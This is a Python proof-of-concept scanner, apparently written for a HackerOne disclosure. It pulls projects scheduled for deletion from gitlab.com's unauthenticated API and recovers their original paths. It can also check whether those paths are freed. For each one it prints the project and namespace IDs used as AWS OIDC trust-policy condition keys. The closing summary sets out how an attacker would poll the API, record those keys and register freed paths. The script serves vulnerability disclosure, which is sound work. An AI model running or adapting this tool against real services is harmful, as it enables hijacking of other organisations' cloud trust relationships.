#!/usr/bin/env python3
"""
GitLab OIDC Phantom Entry Point Scanner
H1 #3739444 - demonstrates that the proposed namespace_id/project_id mitigation
is defeatable via the deletion_scheduled tombstone API.

Attack surface:
  GET /api/v4/projects?search=deletion_scheduled (unauthenticated)
  returns every project currently staged for deletion, including project_id
  and namespace_id — the exact values any OIDC trust policy for that project
  contains. When the original path frees, the attacker already has the
  condition key values needed to understand the full trust surface.

Usage:
  python gitlab_phantom_scan.py                  # scan, default 50 results
  python gitlab_phantom_scan.py --pages 5        # scan 5 pages (100 results)
  python gitlab_phantom_scan.py --check-avail    # also verify freed paths
"""

import urllib.request
import urllib.error
import json
import re
import sys
import time
import argparse

GITLAB_API = "https://gitlab.com/api/v4"
PER_PAGE   = 20

DELETION_RE = re.compile(r'^(.*)-deletion_scheduled-\d+$')


def api_get(path, params=None):
    url = f"{GITLAB_API}{path}"
    if params:
        qs = "&".join(f"{k}={v}" for k, v in params.items())
        url = f"{url}?{qs}"
    req = urllib.request.Request(url, headers={"User-Agent": "poc-phantom-scan-no-auth"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, None
    except Exception as e:
        return 0, None


def original_path(path_with_namespace):
    """Strip -deletion_scheduled-{id} suffix to recover original path."""
    parts = path_with_namespace.split("/")
    project_slug = parts[-1]
    m = DELETION_RE.match(project_slug)
    if m:
        parts[-1] = m.group(1)
        return "/".join(parts)
    return None


def check_path_available(path):
    """Returns True if the original path is 404 (freed for registration)."""
    encoded = path.replace("/", "%2F")
    status, _ = api_get(f"/projects/{encoded}")
    return status == 404


def scan(pages=3, check_avail=False):
    print("=" * 70)
    print("GitLab OIDC Phantom Entry Point Scanner")
    print("H1 #3739444  |  Auth used: NONE  |  Token used: NONE")
    print("=" * 70)
    print()
    print(f"[*] Scanning {GITLAB_API}/projects?search=deletion_scheduled")
    print(f"[*] Pages: {pages}  |  Per page: {PER_PAGE}")
    print(f"[*] Path availability check: {'ON' if check_avail else 'OFF'}")
    print()

    targets = []

    for page in range(1, pages + 1):
        status, data = api_get("/projects", {
            "search":   "deletion_scheduled",
            "per_page": PER_PAGE,
            "page":     page,
            "order_by": "id",
            "sort":     "desc",
        })

        if status != 200 or not data:
            print(f"[!] Page {page} returned HTTP {status} — stopping.")
            break

        if not data:
            print(f"[*] No more results at page {page}.")
            break

        print(f"[*] Page {page}: {len(data)} records")

        for proj in data:
            path_ns    = proj.get("path_with_namespace", "")
            project_id = proj.get("id")
            ns         = proj.get("namespace", {})
            namespace_id   = ns.get("id")
            namespace_path = ns.get("path")
            visibility = proj.get("visibility")

            orig = original_path(path_ns)
            if not orig:
                continue  # not a deletion_scheduled record, skip

            avail = None
            if check_avail:
                avail = check_path_available(orig)
                time.sleep(0.3)  # be polite to the API

            targets.append({
                "project_id":      project_id,
                "namespace_id":    namespace_id,
                "namespace_path":  namespace_path,
                "original_path":   orig,
                "tombstone_path":  path_ns,
                "visibility":      visibility,
                "path_freed":      avail,
            })

        time.sleep(0.5)

    print()
    print("=" * 70)
    print(f"RESULTS — {len(targets)} deletion-scheduled targets found")
    print("=" * 70)
    print()

    freed_count = 0
    for t in targets:
        avail_str = ""
        if t["path_freed"] is True:
            avail_str = "  *** PATH FREED — AVAILABLE FOR REGISTRATION ***"
            freed_count += 1
        elif t["path_freed"] is False:
            avail_str = "  (path still resolving to tombstone)"

        print(f"  original_path  : {t['original_path']}{avail_str}")
        print(f"  tombstone_path : {t['tombstone_path']}")
        print(f"  project_id     : {t['project_id']}")
        print(f"  namespace_id   : {t['namespace_id']}")
        print(f"  visibility     : {t['visibility']}")
        print()
        print(f"  sub claim      : project_path:{t['original_path']}:ref_type:branch:ref:main")
        print(f"  AWS trust policy condition keys (proposed mitigation):")
        print(f'    "gitlab.com:namespace_id": "{t["namespace_id"]}"')
        print(f'    "gitlab.com:project_id"  : "{t["project_id"]}"')
        print()
        print(f"  [!] These condition key values were retrieved with ZERO auth")
        print(f"      from the public tombstone API before path recycling.")
        print("-" * 70)
        print()

    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"  Total deletion-scheduled records found : {len(targets)}")
    if check_avail:
        print(f"  Paths freed and available for squat   : {freed_count}")
    print()
    print("  The /api/v4/projects?search=deletion_scheduled endpoint is a")
    print("  real-time, unauthenticated feed of every project being deleted")
    print("  on gitlab.com. Each record leaks the project_id and namespace_id")
    print("  that any OIDC trust policy for that project contains — the exact")
    print("  values the proposed mitigation (MR !238391) relies on as the")
    print("  'stable, secure' condition keys.")
    print()
    print("  An attacker polls this endpoint, records condition key values,")
    print("  monitors for path availability, then registers the freed path.")
    print("  The phantom entry point is the tombstone API itself.")
    print("=" * 70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--pages",       type=int, default=3,
                        help="Number of API pages to scan (default: 3)")
    parser.add_argument("--check-avail", action="store_true",
                        help="Check whether original paths are freed (slower)")
    args = parser.parse_args()
    scan(pages=args.pages, check_avail=args.check_avail)
